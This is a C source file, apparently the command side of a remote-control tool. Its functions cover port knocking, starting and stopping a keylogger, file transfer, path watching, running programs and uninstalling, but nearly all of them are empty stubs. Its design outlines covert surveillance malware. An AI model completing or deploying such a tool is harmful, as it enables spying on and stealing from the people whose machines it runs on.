#include "protocol.h"
#include "networking.h"
#include "utils.h"
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

void initiate_port_knocking(struct server_options * server_options) {
    send_message(server_options->client_fd, server_options->host, server_options->client_ip_address, PORT_KNOCKING_PORT, NULL);
}

// void handle_packet_data(struct session_info * session_info, const uint16_t data) {
//     if (session_info->packet_counter == 0) {
//         handle_command_codes(session_info, data);
//         session_info->head->data = data;
//         session_info->packet_counter++;
//         return;
//     }
//
//     struct packet_data * packet_data = session_info->head;
//
//     // Traverse to the last filled node
//     while (packet_data->next != NULL) {
//         packet_data = packet_data->next;
//     }
//
//     // Add data
//     packet_data->next = malloc(sizeof(struct packet_data));
//     packet_data->next->data = data;
//     packet_data->next->next = NULL;
//     session_info->packet_counter++;
//
//     const int clear_linked_list = handle_command_codes(session_info, data);
//
//     if (clear_linked_list) {
//         log_message("Clearing linked list");
//         clear_process_packets(session_info);
//     }
// }

void send_start_keylogger(int fd) {

}


void send_stop_keylogger(int fd) {

}

// Disconnect
void send_disconnect(int fd) {

}


void send_file(struct server_options * server_options) {

}


void receive_file(struct server_options * server_options) {
    char message[] = "hello";
    send_message(server_options->client_fd, server_options->host, server_options->client_ip_address, RECEIVING_PORT, message);

}


void send_watch(int fd, enum FILE_TYPE file_type, char * path) {

}


// Run program
void send_run_program(int fd) {

}


// Uninstall
void send_uninstall(int fd) {

}



